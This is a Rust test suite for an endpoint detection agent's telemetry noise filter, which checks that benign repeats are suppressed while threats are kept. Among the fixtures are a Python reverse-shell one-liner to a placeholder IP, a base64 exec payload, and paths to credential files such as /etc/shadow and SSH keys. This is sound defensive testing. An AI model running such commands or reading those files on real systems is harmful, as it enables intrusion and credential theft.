use super::*;
use crate::config::AgentConfig;
use detection::MlScore;

fn runtime() -> AgentRuntime {
    AgentRuntime::new(AgentConfig {
        offline_buffer_backend: "memory".into(),
        ..Default::default()
    })
    .expect("runtime")
}

fn evaluation(
    process: &str,
    parent: &str,
    command: &str,
    path: Option<&str>,
    now: i64,
) -> TickEvaluation {
    let event = TelemetryEvent {
        ts_unix: now,
        event_class: if path.is_some() {
            EventClass::FileOpen
        } else {
            EventClass::ProcessExec
        },
        pid: (now as u32).wrapping_add(100),
        ppid: 42,
        uid: 0,
        process: process.into(),
        parent_process: parent.into(),
        session_id: 42,
        file_path: path.map(str::to_string),
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: Some(command.into()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };
    let outcome = DetectionOutcome::default();
    TickEvaluation {
        event_txn: EventTxn {
            event_class: event.event_class.as_str().into(),
            operation: event.event_class.as_str().into(),
            subject: Some(process.into()),
            object: path.map(str::to_string),
            pid: event.pid,
            uid: 0,
            session_id: 42,
            ts_unix: now,
            key: format!("fixture-{now}"),
        },
        detection_event: event,
        detection_outcome: outcome,
        confidence: Confidence::None,
        action: PlannedAction::AlertOnly,
        compliance: ComplianceResult {
            status: "ok".into(),
            detail: "ok".into(),
            checks: vec![],
        },
        event_envelope: EventEnvelope::info(
            "fixture".into(),
            if path.is_some() {
                "file_open"
            } else {
                "process_exec"
            }
            .into(),
            "{}".into(),
            now,
        ),
    }
}

fn negative_ml(e: &mut TickEvaluation) {
    e.detection_outcome.ml_score = Some(MlScore {
        score: 0.1,
        positive: false,
        raw_positive: false,
        conformal_gated: false,
        decision_threshold: 0.5,
        top_features: vec![],
        conformal_p_value: None,
    });
}

async fn emitted(runtime: &mut AgentRuntime, e: &TickEvaluation) -> usize {
    runtime.tick_telemetry = Some(vec![]);
    runtime
        .queue_connected_telemetry(Some(e))
        .await
        .expect("queue");
    runtime.tick_telemetry.take().unwrap().len()
}

#[tokio::test]
async fn telemetry_noise_observed_qemu_ga_hour_replay() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    // Reconstructed typed fixture: hosting disk monitor repeats every 30 seconds;
    // neither qemu-ga ancestry nor Python is trusted or allowlisted.
    let commands = [
        ("sh", "qemu-ga", "sh -c command -v python >/dev/null"),
        ("sh", "qemu-ga", "sh -c python3 -c 'import os'"),
        ("python3", "sh", "python3 -c 'import os'"),
        ("python3", "sh", "python3 -c 'import subprocess'"),
        ("python3", "sh", "python3 -c 'import json'"),
        ("python3", "sh", "python3 -c 'import string'"),
        ("python3", "sh", "python3 -c 'import re'"),
        ("python3", "sh", "python3 -c 'import platform'"),
        (
            "python3",
            "timeout",
            "python3 /usr/sbin/get-disk-serial.py ''",
        ),
        ("python3", "sh", "python3 /usr/sbin/get-lvm-disk-used.py"),
        ("lsblk", "python3", "lsblk"),
        ("udevadm", "sh", "udevadm info --query=all --name=vda"),
        ("df", "sh", "df -TPl"),
        ("netstat", "sh", "/bin/netstat -s"),
        ("cat", "sh", "cat /var/log/disk_serial.txt"),
    ];
    let paths = [
        "/lib/x86_64-linux-gnu/libc.so.6",
        "/etc/ld.so.cache",
        "/usr/lib/systemd/libsystemd-shared-259.so",
        "/usr/lib/libzstd.so.1",
        "/usr/share/locale/locale.alias",
        "/usr/share/coreutils/locales/en-US/coreutils.ftl",
        "/usr/share/coreutils/locales/id/coreutils.ftl",
        "/dev/null",
        "/etc/shutmsg",
        "/proc/partitions",
    ];
    let mut runtime = runtime();
    let mut total = 0;
    let mut sent = 0;
    let mut protected_sent = 0;
    for round in 0..120 {
        let now = 10_000 + round * 30;
        for (process, parent, command) in commands {
            let mut e = evaluation(process, parent, command, None, now);
            if process == "python3" && command.starts_with("python3 -c") {
                e.detection_outcome.layer1.matched_signatures = vec!["python3 -c".into()];
                e.event_envelope.rule_name = "ioc_sig:python3 -c".into();
                negative_ml(&mut e);
            }
            total += 1;
            sent += emitted(&mut runtime, &e).await;
            for path in paths {
                let mut e = evaluation(process, parent, command, Some(path), now);
                negative_ml(&mut e);
                total += 1;
                sent += emitted(&mut runtime, &e).await;
            }
        }
        // Existing severe/anomaly/phi and alert evidence must survive every round.
        for (severity, class) in [
            ("high", EventClass::ProcessExec),
            ("critical", EventClass::FileOpen),
            ("info", EventClass::Alert),
        ] {
            let mut e = evaluation("python3", "sh", "same-protected-command", None, now);
            e.event_envelope.severity = severity.into();
            e.detection_event.event_class = class;
            total += 1;
            let n = emitted(&mut runtime, &e).await;
            protected_sent += n;
            sent += n;
        }
    }
    println!(
        "REPLAY input={total} emitted={sent} reduction={:.2}% protected={protected_sent}/360",
        100.0 * (total - sent) as f64 / total as f64
    );
    assert_eq!(protected_sent, 360);
    assert!(
        sent * 10 <= total,
        "expected >=90% reduction: {sent}/{total}"
    );
    let status = runtime
        .build_heartbeat_runtime_payload("active")
        .status
        .last_detection;
    assert!(status.contains("suppressed_static_reads_total="));
    assert!(status.contains("suppressed_negative_ml_total="));
    assert!(status.contains("suppressed_repeats_total="));
}

#[tokio::test]
async fn telemetry_noise_preserves_malicious_variants_and_distinct_commands() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    let mut benign = evaluation("python3", "sh", "python3 -c 'import os'", None, 10_000);
    benign.detection_outcome.layer1.matched_signatures = vec!["python3 -c".into()];
    benign.event_envelope.rule_name = "ioc_sig:python3 -c".into();
    for expected in [1, 1, 1, 0] {
        assert_eq!(emitted(&mut runtime, &benign).await, expected);
    }
    for (process, parent, rule) in [
        ("python3", "qemu-ga", "ioc_sig:python3 -c"),
        ("python", "sh", "ioc_sig:python3 -c"),
        ("python3", "sh", "new-rule"),
    ] {
        let mut distinct = evaluation(process, parent, "python3 -c 'import os'", None, 10_001);
        distinct.event_envelope.rule_name = rule.into();
        distinct.detection_outcome.layer1.matched_signatures = vec![rule.into()];
        assert_eq!(emitted(&mut runtime, &distinct).await, 1);
    }
    for command in [
        "python3 -c 'import socket,subprocess; s=socket.socket(); s.connect((\"198.51.100.1\",4444)); subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3 -c 'import base64;exec(base64.b64decode(payload))'",
        "python3 -c 'import os; print(os.getuid())'",
    ] {
        let mut malicious = evaluation("python3", "sh", command, None, 10_001);
        malicious.detection_outcome.layer1.matched_signatures = benign.detection_outcome.layer1.matched_signatures.clone();
        malicious.event_envelope.rule_name = benign.event_envelope.rule_name.clone();
        assert_eq!(emitted(&mut runtime, &malicious).await, 1, "{command}");
    }
    for path in [
        "/usr/lib/libchanged.so",
        "/etc/shadow",
        "/home/user/.ssh/id_rsa",
        "/usr/lib/eguard-agent/libself.so",
        "/home/user/.mozilla/firefox/logins.json",
        "/home/user/.netrc",
        "/etc/krb5.keytab",
        "/home/user/.config/chromium/Default/Login Data",
        "shadow",
    ] {
        let mut e = evaluation(
            "python3",
            "sh",
            "python3 -c 'import os'",
            Some(path),
            10_002,
        );
        e.detection_event.file_write = path == "/usr/lib/libchanged.so";
        negative_ml(&mut e);
        for _ in 0..5 {
            assert_eq!(emitted(&mut runtime, &e).await, 1, "{path}");
        }
    }
}

#[tokio::test]
async fn telemetry_noise_repeat_window_expiry_and_clock_rewind_fail_open() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    let mut e = evaluation("python3", "sh", "python3 -c 'import os'", None, 10_000);
    for expected in [1, 1, 1, 0] {
        assert_eq!(emitted(&mut runtime, &e).await, expected);
    }
    e.event_envelope.created_at_unix = 13_600;
    assert_eq!(emitted(&mut runtime, &e).await, 1);
    e.event_envelope.created_at_unix = 9_999;
    assert_eq!(emitted(&mut runtime, &e).await, 1);
}

#[tokio::test]
async fn telemetry_noise_negative_ml_without_evidence_is_not_a_detection() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    let mut e = evaluation(
        "cat",
        "qemu-ga",
        "cat /proc/partitions",
        Some("/proc/partitions"),
        10_000,
    );
    negative_ml(&mut e);
    assert_eq!(emitted(&mut runtime, &e).await, 0);
    e.detection_outcome.layer1.matched_signatures = vec!["credential-access".into()];
    assert_eq!(emitted(&mut runtime, &e).await, 1);
    e.detection_outcome.layer1.matched_signatures.clear();
    e.detection_outcome.ml_score.as_mut().unwrap().positive = true;
    assert_eq!(emitted(&mut runtime, &e).await, 1);
    e.detection_outcome.ml_score.as_mut().unwrap().positive = false;
    e.event_envelope.severity = "medium".into();
    assert_eq!(emitted(&mut runtime, &e).await, 1);
}

#[tokio::test]
async fn telemetry_noise_static_reads_are_filtered_only_after_detection() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    let mut e = evaluation("cat", "qemu-ga", "cat", Some("/etc/ld.so.cache"), 10_000);
    assert_eq!(emitted(&mut runtime, &e).await, 0);
    e.detection_outcome.signals.exploit_indicator = true;
    assert_eq!(emitted(&mut runtime, &e).await, 1);
    e.detection_outcome.signals.exploit_indicator = false;
    e.event_envelope.severity = "medium".into();
    assert_eq!(emitted(&mut runtime, &e).await, 1);
    e.event_envelope.severity = "info".into();
    e.event_envelope.rule_name = "test-signature".into();
    e.detection_outcome.layer1.matched_signatures = vec!["test-signature".into()];
    assert_eq!(emitted(&mut runtime, &e).await, 1);
    e.detection_outcome.layer1.matched_signatures.clear();
    e.event_envelope.rule_name = "test-ml".into();
    negative_ml(&mut e);
    e.detection_outcome.ml_score.as_mut().unwrap().positive = true;
    assert_eq!(emitted(&mut runtime, &e).await, 1);
}

#[tokio::test]
async fn telemetry_noise_degraded_delivery_uses_the_same_filter() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    let e = evaluation("cat", "qemu-ga", "cat", Some("/etc/ld.so.cache"), 10_000);
    assert_eq!(
        runtime
            .buffer_degraded_telemetry_if_present(Some(&e))
            .unwrap(),
        0
    );
    assert_eq!(runtime.buffer.pending_count(), 0);
    let e = evaluation("cat", "qemu-ga", "cat", Some("/etc/shadow"), 10_000);
    assert!(
        runtime
            .buffer_degraded_telemetry_if_present(Some(&e))
            .unwrap()
            > 0
    );
    assert_eq!(runtime.buffer.pending_count(), 1);
}

#[tokio::test]
async fn telemetry_noise_filtered_first_event_still_flushes_buffered_alerts() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    runtime.telemetry_send_success = true;
    let mut alert = EventEnvelope::info("fixture".into(), "alert".into(), "{}".into(), 9_999);
    alert.severity = "critical".into();
    runtime.buffer.enqueue(alert).unwrap();
    runtime.tick_telemetry = Some(vec![]);
    let e = evaluation("cat", "qemu-ga", "cat", Some("/etc/ld.so.cache"), 10_000);
    runtime
        .run_connected_telemetry_stage(Some(&e))
        .await
        .unwrap();
    assert_eq!(runtime.buffer.pending_count(), 0);
    assert_eq!(runtime.pipeline_events_sent, 1);
    assert_eq!(runtime.telemetry_send_batches, vec![1]);
}

#[tokio::test]
async fn telemetry_noise_real_detector_keeps_malicious_python() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    for command in [
        "python3 -c 'import socket,subprocess; s=socket.socket(); s.connect((\"198.51.100.10\",4444)); subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3 -c 'import base64;exec(base64.b64decode(payload))'",
    ] {
        let mut e = evaluation("python3", "sh", command, None, 10_000);
        e.detection_outcome = runtime.detection_state.process_event(&e.detection_event).unwrap();
        assert!(!e.detection_outcome.layer1.matched_signatures.is_empty(), "{command}");
        e.event_envelope.rule_name = AgentRuntime::detection_rule_name(&e.detection_outcome).unwrap();
        e.event_envelope.severity = confidence_to_severity(e.detection_outcome.confidence).into();
        assert_eq!(emitted(&mut runtime, &e).await, 1, "{command}");
    }
}

#[tokio::test]
async fn telemetry_noise_custom_agent_config_path_is_preserved() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    runtime.config.agent_config_path = Some("/usr/share/locale/custom-agent.conf".into());
    let mut e = evaluation(
        "cat",
        "qemu-ga",
        "cat",
        Some("/usr/share/locale/custom-agent.conf"),
        10_000,
    );
    negative_ml(&mut e);
    for _ in 0..5 {
        assert_eq!(emitted(&mut runtime, &e).await, 1);
    }
}

#[tokio::test]
async fn telemetry_noise_switch_off_restores_all_legacy_evaluations() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    runtime.config.telemetry_noise_filter = false;
    for _ in 0..120 {
        for path in [
            None,
            Some("/lib/libc.so.6"),
            Some("/etc/ld.so.cache"),
            Some("/proc/partitions"),
        ] {
            let mut e = evaluation("python3", "sh", "python3 -c 'import os'", path, 10_000);
            negative_ml(&mut e);
            assert_eq!(emitted(&mut runtime, &e).await, 1);
        }
    }
}

#[tokio::test]
async fn telemetry_noise_key_cap_fails_open_and_bounds_memory() {
    let _guard = crate::test_support::TestEnvGuard::new(&[]);
    let mut runtime = runtime();
    for key in 0..8_200 {
        let e = evaluation(
            "python3",
            "sh",
            &format!("python3 -c 'print({key})'"),
            None,
            10_000,
        );
        for _ in 0..3 {
            assert_eq!(emitted(&mut runtime, &e).await, 1);
        }
        assert_eq!(emitted(&mut runtime, &e).await, usize::from(key >= 8_192));
    }
}
